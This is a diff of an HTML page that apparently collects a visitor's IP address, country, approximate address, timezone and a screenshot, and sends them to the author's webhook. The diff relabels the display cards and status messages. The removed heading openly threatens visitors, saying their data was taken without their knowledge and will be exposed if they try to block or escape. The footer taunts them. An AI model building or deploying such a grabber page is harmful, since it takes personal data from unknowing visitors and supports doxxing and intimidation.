@@ -38,30 +38,30 @@
 </head>
 <body>
   <div class="container" id="capture-root">
-    <h1>If you actually clicked this website, i now have every info listed in here, sent to my webhook, without you knowing, try blocking me, escaping, doing anything, will lead me to exposing it</h1>
+    <h1>Everything here sent just to my webhook.</h1>
     <p class="desc">wait until everything loads.</p>
 
     <div class="grid">
       <div class="card">
         <strong id="ip">Loading...</strong>
-        <div class="label">1</div>
+        <div class="label">Ip Address</div>
       </div>
       <div class="card">
         <strong id="country">Loading...</strong>
-        <div class="label">2</div>
+        <div class="label">Country</div>
       </div>
       <div class="card">
         <strong id="avgAddress">Loading...</strong>
-        <div class="label">3</div>
+        <div class="label">Avg Address</div>
       </div>
       <div class="card">
         <strong id="timezone">Loading...</strong>
-        <div class="label">4</div>
+        <div class="label">Timezone</div>
       </div>
     </div>
 
     <div id="status">Preparing…</div>
-    <button class="btn" id="resendBtn">Resend screenshot</button>
+    <button class="btn" id="resendBtn">Resend</button>
 
     <footer>You're now <code>cooked</code>thank you for your time</footer>
   </div>
@@ -151,7 +151,7 @@
       });
 
       if (sendResp.ok) {
-        statusEl.textContent = 'Screenshot sent successfully ✅';
+        statusEl.textContent = 'success ✅';
       } else {
         // may fail due to CORS — show details in console
         const t = await sendResp.text().catch(()=> '');
